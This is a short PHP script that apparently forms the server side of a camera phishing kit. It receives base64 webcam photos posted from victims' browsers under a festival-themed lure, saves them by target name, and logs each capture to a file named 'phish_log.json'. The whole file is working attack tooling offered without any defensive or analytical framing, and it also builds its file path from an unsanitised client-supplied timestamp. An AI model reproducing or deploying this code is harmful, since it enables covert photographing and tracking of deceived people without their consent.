<?php
if ($_POST['photo']) {
    $target = $_POST['target'] ?? 'Unknown';
    $festival = $_POST['festival'] ?? 'Festival';
    $timestamp = $_POST['timestamp'] ?? date('Y-m-d H:i:s');
    $userAgent = $_POST['userAgent'] ?? 'Unknown';
    
    // Save photo
    $photoData = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $_POST['photo']));
    $filename = "uploads/" . $timestamp . "_" . preg_replace('/[^a-zA-Z0-9]/', '_', $target) . ".jpg";
    
    if (!file_exists('uploads')) {
        mkdir('uploads', 0777, true);
    }
    
    file_put_contents($filename, $photoData);
    
    // Log
    $log = [
        'target' => $target,
        'festival' => $festival,
        'timestamp' => $timestamp,
        'userAgent' => $userAgent,
        'filename' => $filename
    ];
    
    file_put_contents('phish_log.json', json_encode($log) . "\n", FILE_APPEND);
    
    echo "OK";
}
?>
